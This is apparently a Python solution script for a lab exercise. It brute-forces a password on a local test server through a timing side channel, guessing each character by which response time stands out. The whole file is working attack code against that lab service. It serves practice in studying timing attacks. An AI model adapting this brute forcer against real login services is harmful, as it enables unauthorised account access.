import requests
import string
from numpy import mean


class OnEstDesBrutes:
    car = string.ascii_letters + string.digits

    def __init__(self):
        self.password = ''
        self.last_time = 0
        self.password_len = 0
        self.url = "http://192.168.137.146:5000"

    def request_level(self, level: str):
        json = {
            "level": level
        }
        response = requests.post(url=self.url + '/level', json=json, verify=False)
        if response.status_code == 200:
            print(response.text)
        else:
            print(f'Erreur : {response.status_code} : {response.text}')
    
    def request_pwd(self, letter: str):
        json = {
            "password": (self.password + letter).ljust(self.password_len, '0')
        }
        response = requests.post(url=self.url + '/check', json=json, verify=False)
        if response.status_code == 200 or response.json()['result']:
            if response.json()['result']['Valid']:
                print(self.password + letter)
                return None
            return int(response.json()['result']['time'])
        else:
            print(f'Erreur : {response.status_code} : {response.text}')
            return
    
    def brute_force_len_password(self):
        while self.request_pwd('') == 0:
            self.password_len += 1
    
    def max_time(self, temps: list[int]) -> int | None:
        if len(temps) < 2:
            return
        i = temps.index(max(temps))
        tmp_mean = mean(temps[:i] + temps[i+1:])
        if temps[i] > tmp_mean + 15:
            return i
        
    def brute_force_char(self) -> None:
        time = []
        for l in self.car:
            t = -1
            while t < self.last_time:
                # Gère les erreurs si un temps est inormalement bas
                t = self.request_pwd(l)
                if t == None:
                    return
                print((self.password + l).ljust(self.password_len, '0'), t)
            
            time.append(t)
            # Si un temps significatif prends ce caractère au lieu d'attendre la fin de tout les tests
            index = self.max_time(time)
            if index != None:
                self.password += self.car[index]
                return 1
        
        self.password += self.car[time.index(max(time))]
        self.last_time = max(time) - 20
        return 1
    
    def brute_force_password(self, level: int = 0):
        self.request_level(level)
        input('Appuyez sur Entrée pour commencer...')
        while self.brute_force_char():
            print(self.password)

a = OnEstDesBrutes()
a.brute_force_password('0')